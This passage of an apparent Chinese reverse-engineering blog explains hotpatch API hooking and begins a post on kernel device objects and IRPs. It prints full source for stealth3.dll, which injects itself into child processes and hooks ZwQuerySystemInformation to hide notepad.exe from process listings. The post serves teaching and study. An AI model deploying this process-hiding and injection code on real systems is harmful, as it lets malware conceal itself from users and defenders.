Fix，与修改5个字节代码的技术不同，使用热补丁技术时将修改7个字节代码，所以该技术又称为7字节代码修改技术。\n普通API起始代码的形态（1）API代码以”MOV EDI,EDI”指令开始（IA-32指令：0x8BFF）\n（2）API代码上方有5个NOP指令（IA-32指令：0x90）\n“MOV EDI,EDI”指令大小为2个字节，用于将EDI寄存器的值再次传送给EDI寄存器，这没有什么实际意义。NOP指令为1个字节大小，不进行任何操作（该NOP指令存在于函数与函数之间，甚至都不会被执行）。也就是说，API起始代码的MOV指令（2个字节）与其上方的5个NOP指令（5个字节）合起来共7个字节的指令没有任何意义。\n很显然，kernel32.dll、user32.dll、gdi32.dll是Windows OS相当重要的库。微软为什么使用这种方式来制作系统库呢？原因是为了方便打热补丁。热补丁由API钩取组成，在进程处于运行状态时临时更改进程内存中的库文件（重启系统时，修改的目标库文件会被完全取代）。\n工作原理及特征下面使用热补丁方法钩取kernel32.CreateProcessA() API来理解学习热补丁钩取技术\n二次跳转首先将API起始代码之前的5个字节修改为FAR JMP（E9 XXXXXXXX），跳转到用户钩取函数处（989A68）。然后将API起始代码的2个字节修改为SHORT JMP指令（EB F9）。该SHORT JMP指令用来跳转到前面的FAR JMP指令处。\n修改之前\n\n修改之后\n\n调用CreateProcessA() API时，遇到API起始地址（77642082）处的JMP kernel32.7764207D指令，就会跳转到紧接其上方的指令地址（7764207D）。然后遇到JMP 989A68指令，跳转到实际钩取的函数地址（989A68）。像这样经过2次连续跳转，就完成了对指定API的钩取操作（称为二次跳转）。这一过程需要注意的是，修改的7个字节的指令（NOP*5、MOV EDI,EDI）原来都是毫无意义的。\n\n\n\n\n\n\n\n\n\n从图中的7764207D、77642082地址可以看出，虽然都是JMP指令，但指令形态不同。7764207D地址处的指令形式为E9 XXXXXXXX，大小为5字节，被称为FAR JMP，用来实现远程跳转（可以跳转到进程内存用户区域中的任意位置）；而77642082地址处的指令形式为EB YY，大小为2字节，被称为SHORT JMP，它只能以当前EIP为基准，在-128~127的范围内跳转。\n不需要在钩取函数内部进行脱钩&#x2F;挂钩操作修改代码的前5个字节进行钩取的技术，使用时需要在钩取函数内部反复脱钩、挂钩，这可能导致系统性能下降。而使用热补丁技术钩取API时，不需要在钩取函数内部进行脱钩、挂钩操作。在5个字节代码修改技术中脱钩&#x2F;挂钩是为了调用原函数，而使用热补丁技术钩取API时，在API代码遭到修改的状态下也能正常调用原API。这是因为，从API角度看只是修改了其起始代码的MOV EDI,EDI指令（无意义的2个字节），从[API起始地址+2]地址开始，仍能正常调用原API，且执行的动作完全一样。\n基于Win10的隐藏notepad.exe练习stealth3.dll使用了热补丁API钩取技术（即HotFix Hook）\nstealth3.cpp源码分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;tchar.h&quot;#define STR_MODULE_NAME\t\t\t\t\t(L&quot;stealth3.dll&quot;)#define STR_HIDE_PROCESS_NAME\t\t\t(L&quot;notepad.exe&quot;)#define STATUS_SUCCESS\t\t\t\t\t(0x00000000L) typedef LONG NTSTATUS;typedef enum _SYSTEM_INFORMATION_CLASS &#123;    SystemBasicInformation = 0,    SystemPerformanceInformation = 2,    SystemTimeOfDayInformation = 3,    SystemProcessInformation = 5,    SystemProcessorPerformanceInformation = 8,    SystemInterruptInformation = 23,    SystemExceptionInformation = 33,    SystemRegistryQuotaInformation = 37,    SystemLookasideInformation = 45&#125; SYSTEM_INFORMATION_CLASS;typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    BYTE Reserved1[52];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)(    SYSTEM_INFORMATION_CLASS SystemInformationClass,     PVOID SystemInformation,     ULONG SystemInformationLength,     PULONG ReturnLength);typedef BOOL (WINAPI *PFCREATEPROCESSA)(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation);typedef BOOL (WINAPI *PFCREATEPROCESSW)(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation);BYTE g_pOrgZwQSI[5] = &#123;0,&#125;;BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect, dwAddress;\tBYTE pBuf[5] = &#123;0xE9, 0, &#125;;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] == 0xE9 )\t\treturn FALSE;\tVirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\tmemcpy(pOrgBytes, pFunc, 5);\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc - 5;\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\tmemcpy(pFunc, pBuf, 5);\tVirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect, dwAddress;\tBYTE pBuf[5] = &#123; 0xE9, 0, &#125;;    BYTE pBuf2[2] = &#123; 0xEB, 0xF9 &#125;;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] == 0xEB )\t\treturn FALSE;\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc;\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\tmemcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] != 0xE9 )\t\treturn FALSE;\tVirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\tmemcpy(pFunc, pOrgBytes, 5);\tVirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    BYTE pBuf[5] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;    BYTE pBuf2[2] = &#123; 0x8B, 0xFF &#125;;    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    if( pByte[0] != 0xEB )        return FALSE;    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,             // lookup privilege on local system                              lpszPrivilege,    // privilege to lookup                               &amp;luid) )          // receives LUID of privilege    &#123;        printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        printf(&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll2(HANDLE hProcess, LPCTSTR szDllName)&#123;\tHANDLE hThread;\tLPVOID pRemoteBuf;\tDWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR);\tFARPROC pThreadProc;\tpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,                                 MEM_COMMIT, PAGE_READWRITE);    if( pRemoteBuf == NULL )        return FALSE;\tWriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName,                        dwBufSize, NULL);\tpThreadProc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;),                                  &quot;LoadLibraryW&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  (LPTHREAD_START_ROUTINE)pThreadProc,                                  pRemoteBuf, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tVirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\tCloseHandle(hThread);\treturn TRUE;&#125;NTSTATUS WINAPI NewZwQuerySystemInformation(    SYSTEM_INFORMATION_CLASS SystemInformationClass, \tPVOID SystemInformation, \tULONG SystemInformationLength, \tPULONG ReturnLength)&#123;\tNTSTATUS status;\tFARPROC pFunc;\tPSYSTEM_PROCESS_INFORMATION pCur, pPrev;\tchar szProcName[MAX_PATH] = &#123;0,&#125;;\tunhook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, g_pOrgZwQSI);\tpFunc = GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;),                            &quot;ZwQuerySystemInformation&quot;);\tstatus = ((PFZWQUERYSYSTEMINFORMATION)pFunc)             (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);\tif( status != STATUS_SUCCESS )\t\tgoto __NTQUERYSYSTEMINFORMATION_END;\tif( SystemInformationClass == SystemProcessInformation )\t&#123;\t\tpCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;\t\twhile(TRUE)\t\t&#123;            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], STR_HIDE_PROCESS_NAME))\t\t\t    &#123;\t\t\t\t    if(pCur-&gt;NextEntryOffset == 0)\t\t\t\t\t    pPrev-&gt;NextEntryOffset = 0;\t\t\t\t    else\t\t\t\t\t    pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;\t\t\t    &#125;\t\t\t    else\t\t\t\t\t\t    pPrev = pCur;\t// 盔窍绰 橇肺技胶甫 给 茫篮 版快父 pPrev 技泼            &#125;\t\t\tif(pCur-&gt;NextEntryOffset == 0)\t\t\t\tbreak;\t\t\tpCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur-&gt;NextEntryOffset);\t\t&#125;\t&#125;__NTQUERYSYSTEMINFORMATION_END:\thook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;,                  (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);\treturn status;&#125;BOOL WINAPI NewCreateProcessA(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation)&#123;    BOOL bRet;    FARPROC pFunc;    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;CreateProcessA&quot;);    pFunc = (FARPROC)((DWORD)pFunc + 2);    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,                                     lpCommandLine,                                     lpProcessAttributes,                                     lpThreadAttributes,                                     bInheritHandles,                                     dwCreationFlags,                                     lpEnvironment,                                     lpCurrentDirectory,                                     lpStartupInfo,                                     lpProcessInformation);    //向生成的子进程注入 stealth3.dll    if( bRet )        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);    return bRet;&#125;BOOL WINAPI NewCreateProcessW(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation)&#123;    BOOL bRet;    FARPROC pFunc;    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;CreateProcessW&quot;);    pFunc = (FARPROC)((DWORD)pFunc + 2);    bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,                                     lpCommandLine,                                     lpProcessAttributes,                                     lpThreadAttributes,                                     bInheritHandles,                                     dwCreationFlags,                                     lpEnvironment,                                     lpCurrentDirectory,                                     lpStartupInfo,                                     lpProcessInformation);    //向生成的子进程注入 stealth3.dll    if( bRet )        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);    return bRet;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // 异常处理使注入不会发生在HideProc2.exe进程    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc2.exe&quot;) )        return TRUE;    // change privilege    SetPrivilege(SE_DEBUG_NAME, TRUE);    switch( fdwReason )    &#123;        case DLL_PROCESS_ATTACH :             // hook            hook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessA&quot;,                              (PROC)NewCreateProcessA);            hook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessW&quot;,                              (PROC)NewCreateProcessW);            hook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;,                          (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);            break;        case DLL_PROCESS_DETACH :            // unhook            unhook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessA&quot;);            unhook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessW&quot;);            unhook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;,                            g_pOrgZwQSI);            break;    &#125;    return TRUE;&#125;\n\nhook_by_hotpatch()该函数运用热补丁技术钩取API\n123456789101112131415161718192021222324252627BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect, dwAddress;\tBYTE pBuf[5] = &#123; 0xE9, 0, &#125;;    BYTE pBuf2[2] = &#123; 0xEB, 0xF9 &#125;;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] == 0xEB )\t\treturn FALSE;\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc;\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\tmemcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;\n\n使用热补丁技术钩取API时，操作顺序非常重要。首先要将API起始地址上方的NOP*5指令修改为JMP XXXXXXXX。通过下面公式很容易求出XXXXXXXX值（即上述代码中dwAddress变量），计算公式如下：\n1dwAddress=(DWORD)pfnNew - (DWORD)pFunc\n\n\n\n\n\n\n\n\n\n\n上述公式与之前讲解的inline hook函数时介绍的地址计算公式实际上是一样的。\nXXXXXXXX&#x3D;要跳转的地址-当前指令地址-当前指令长度（5）\n当前指令（NOP*5）地址&#x3D;pFunc-5，所以上述公式可做如下修改：\nXXXXXXXX&#x3D;(DWORD)pfnNew - ((DWORD)pFunc - 5) - 5\n​                &#x3D;(DWORD)pfnNew - (DWORD)pFunc\n*pfnNew &#x3D; 用户钩取函数\n*pFunc &#x3D; 原API地址\n求得XXXXXXXX值后，使用下述代码将NOP*5指令修改为JMP XXXXXXXX指令。\n12memcpy(&amp;pBuf[1], &amp;dwAddress, 4);memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);\n\n接下来，将位于API起始地址处的MOV EDI,EDI指令（2个字节大小）替换为JMP YY指令。\n1memcpy(pFunc, pBuf2, 2);\n\n\n\n\n\n\n\n\n\n\n使用JMP YY指令时，要先计算出YY值，计算公式与前面相同。\nYY&#x3D;要跳转的地址-当前指令地址-当前指令长度（2）\n要跳转的地址是pFunc-5，当前指令地址为pFunc，YY值计算如下：\nYY&#x3D;(pFunc-5)-pFunc-2&#x3D;-7&#x3D;0xF9\n热补丁技术中，YY值总为0xF9，将其硬编码到源代码就可以了（0xF9是-7的”2的补码”形式）。\nunhook_by_hotpatch()该函数用于脱钩\n1234567891011121314151617181920212223242526BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    BYTE pBuf[5] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;    BYTE pBuf2[2] = &#123; 0x8B, 0xFF &#125;;    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    if( pByte[0] != 0xEB )        return FALSE;    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;\n\nNewCreateProcessA()123456789101112131415161718192021222324252627282930313233343536BOOL WINAPI NewCreateProcessA(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation)&#123;    BOOL bRet;    FARPROC pFunc;    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;CreateProcessA&quot;);    pFunc = (FARPROC)((DWORD)pFunc + 2);    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,                                     lpCommandLine,                                     lpProcessAttributes,                                     lpThreadAttributes,                                     bInheritHandles,                                     dwCreationFlags,                                     lpEnvironment,                                     lpCurrentDirectory,                                     lpStartupInfo,                                     lpProcessInformation);    //向生成的子进程注入 stealth3.dll    if( bRet )        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);    return bRet;&#125;\n\n可以看出，该函数不再进行脱钩、挂钩操作，且与已有函数根本的不同在于添加了计算pFunc的语句：\n1pFunc = (FARPROC)((DWORD)pFunc + 2);\n\n该代码语句用于1跳过位于API起始地址处的JMP YY指令（2个字节，原指令为MOV EDI,EDI），从紧接的下一条指令开始执行，与调用原API的效果一样。\n使用热补丁API钩取技术时要考虑的问题热补丁API钩取技术并不是万能的，使用时目标API必须满足它的使用条件（NOP*5指令+MOV EDI,EDI指令），但有些API却不满足这一条件，如kernel32.GetStartInfoA。所以使用前要确定其是否满足条件\n","slug":"HotFix Hook","date":"2022-03-28T03:12:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook","author_index":"0netry"},{"id":"ba14c8c55e36720dc30bd604d682a355","title":"IRP Hook","content":"3环与0环通信（常规方式）本篇介绍一下3环与0环通信的原理（常规方式），介绍与之相关的结构体，对象等，最后代码实现并模拟操作系统进行3环和0环的通信。\n设备对象内核通信的对象内核中的通信，与应用层窗口间的通信类似，只是封装消息的结构体不同，接收消息结构体的对象不同\n\n\n窗口通信：\n1）消息结构体：MSG\n2）接收消息的对象：窗口对象（Hwnd）\n\n内核通信：\n1）消息结构体：IRP（I&#x2F;O Request Package）\n2）接收消息的对象：设备对象（DeviceObject）\n\n\n所以想要在内核通信，需要有(至少)一个用来接收和发送消息的设备对象。\n创建设备对象窗口对象的创建也与设备对象也有不少共同点，这里继续拿来类比\n\n窗口对象：1）可以创建多个\n2）需要指定父窗口\n\n设备对象：1）可以创建多个\n2）需要指定所属驱动对象\n\n\nWindows提供了内核函数IoCreateDevice用来创建设备对象，参考如下代码：\n1234567891011121314151617#define DEVICE_NAME L&quot;\\\\Device\\\\MyDevice&quot;\tPDEVICE_OBJECT pDeviceObj = NULL;UNICODE_STRING DeviceName;RtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);NTSTATUS status = IoCreateDevice(pDriverObj,\t0,\t&amp;DeviceName,\tFILE_DEVICE_UNKNOWN,\t0,\tFALSE,\t&amp;pDeviceObj); if (status != STATUS_SUCCESS) &#123;\tDbgPrint(&quot;Device Create Failed!\\n&quot;);\treturn status;&#125;\n\n\npDriverObj：指定该设备创建后属于哪个驱动对象（PDRIVER_OBJECT）\n&amp;DeviceName：定义了一个DEVICE_NAME的宏，被用来初始化设备对象的名字。这个名字不能随便改（即”\\Device\\xxxxx”形式），在设备创建时，会根据设备名，将该设备挂到一个名为Device的树形结构中，几乎所有设备都挂在这。若改变此值，则会挂到其它树中。\nFILE_DEVICE_UNKNOWN：该处填写设备的类型，由于我们并没有实际的设备，所以选择UNKNOWN\n&amp;pDeviceObj：这个参数可以看作是一个二级指针，它指向一个地址。这个地址存着一个指针pDeviceObj，这个指针指向一个设备结构体。另一个要说明的是，这个参数是一个OUT类型的参数，原本pDeviceObj指向的内容是空的，在执行完设备创建的函数后，其指向创建出的设备对象。\n\n以上为几个比较关键的参数介绍，其余参数按照上述代码填写即可，具体含义可以参考官方文档\n数据传输方式\n首先查看一下设备对象这个结构体，发现它有很多字段，这里我们只需要关注其中一个，就是Flags，这是一个四字节的值，设置了3环和0环数据交互的方式。语法如下：\n12//这里必须是“|=”，不能直接写成“=”pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;\n\n来看看有哪几种方式：\n\n缓冲区方式读写（DO_BUFFERED_IO）：I&#x2F;O管理器会在内核空间中分配一块内存，把用户空间的数据复制到这块内存中，这样内核程序就可以访问这些数据，实现数据通信。适合数据量较小时使用。（之前介绍的跨进程读取内存用的就是这种方法）\n直接方式读写（DO_DIRECT_IO）：I&#x2F;O管理器会将用户空间内的某片内存对应的物理页锁住，同时在内核空间再映射一份，这样内核空间线性地址与用户空间线性地址对应的是同一个物理页，这是双方均可以对这个物理页的内容进行读写，实现数据通信，此方法适合数据量较大时使用。（类似_KUSER_SHARED_DATA结构）\n默认方式读写（NEITHER_IO）：当创建完设备对象后，不设置Flags的值，使用的就是此类读写方式。默认读写方式，仅仅提供给内核程序用户空间的线性地址，直接进行数据的读取。这样做的坏处是，如果发生线程切换，读取的就不再是同一份数据，容易造成程序读取错误。\n\n通常情况下，我们实验的数据不会太大，主要采取DO_BUFFERED_IO这种方式。这里有一点要注意的是，在设置DeviceObject.Flags的值时，千万不要直接用”&#x3D;”，必须使用”|&#x3D;”，因为在创建设备对象结构体时，Flags是有初始值的，若这里直接给Flags赋值，会刷新掉之前的初始值，导致程序执行时发生错误（驱动技仅能成功执行一次，第二次会失败）。\n设置符号链接Windows规定，应用层的程序是不能直接访问设备对象的，所以符号链接诞生了。符号链接可以与设备对象绑定，这样应用层的程序就可以通过符号链接进行对设备对象的访问。符号链接在内核与3环的形式有所不同：\n\n内核：符号链接以”\\??\\“开头，例如C盘就是”\\??\\C:”\n用户模式：符号链接以”\\\\.\\“开头，例如C就算”\\\\.\\C:”\n\n具体在代码中还需要加入更多的“\\“用来转译符号，代码如下：\nRing012345#define SYM_LINK_NAME L&quot;\\\\??\\\\MyRing3Device&quot;UNICODE_STRING SymbolicLinkName;RtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);\n\nRing31234567891011#define SYM_LINK_NAME L&quot;\\\\\\\\.\\\\MyRing3Device&quot;//3环这里直接使用符号链接指向0环创建设备作为CreateFile的参数//不用再次设置符号链接，符号链接是在0环设置的，这里在3环主要介绍用法HANDLE hDevice = CreateFileW(\t\tSYM_LINK_NAME, \t\tGENERIC_READ | GENERIC_WRITE, \t\t0,\t\tNULL, \t\tOPEN_EXISTING, \t\tFILE_ATTRIBUTE_NORMAL, \t\tNULL);\n\nIRP与派遣函数对比消息处理先来看一张图\n\n继续拿3环的窗口应用来做对比\n\n用户空间：当用户单击鼠标时，会触发一个事件，操作系统会将这个事件的内容描述信息封装到一个MSG结构中，作为消息，发送给窗口对象，窗口对象接收到消息，会根据这个消息的类型，来执行相应的处理函数，我们称这种处理函数叫做回调函数。\n1）触发事件：鼠标点击等\n2）消息结构体：MSG\n3）消息接收对象：窗口对象\n4）处理函数：窗口回调函数\n\n内核空间：当3环程序调用CreateFile函数时，这是操作系统会产生相应的IRP，这个IRP封装了3环程序调用的相关描述信息，接着会把IRP发送给内核空间的设备对象，设备对象会解析IRP，然后会根据IRP提供的信息，执行相应的派遣函数\n1）触发事件：3环程序调用CreateFile函数等\n2）消息结构体：IRP\n3）消息接收对象：设备对象\n4）处理函数：派遣函数\n\n\nIRP的类型正如3环的窗口对象，在接收到不同类型消息时会执行不同的回调函数。当应用层通过CreateFile，ReadFile，WriteFile，CloseHandle等函数对设备进行操作时，也会使操作系统产生不同种类的IRP，这里简要总结一下部分3环函数与IRP的对应关系：\n\n\n\n应用层函数\nIRP种类\n\n\n\nCreateFile\nIRP_MJ_CREATE\n\n\nReadFile\nIRP_MJ_READ\n\n\nWriteFile\nIRP_MJ_WRITE\n\n\nCloseHandle\nIRP_MJ_CLOSE\n\n\nDeviceIoControl\nIRP_MJ_DEVICE_CONTROL\n\n\n派遣函数1）注册派遣函数\n当IRP传递给设备对象后，会根据IRP的种类调用特定的派遣函数。不同的IRP对应不同的派遣函数，NT框架预定了28（0x1C）种派遣函数，可以在驱动对象MajorFunction数组中注册这些派遣函数 \n\n代码示例：\n123//这里仅设置了两个用来演示pDriverObj-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;pDriverObj-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;\n\n其中IrpCreateProc和IrpCloseProc都是我们需要自己定义的派遣函数，遵守一定的格式\n2）派遣函数格式\n这里以IrpCreateProc来举例：\n1234567891011NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Create Dispatch 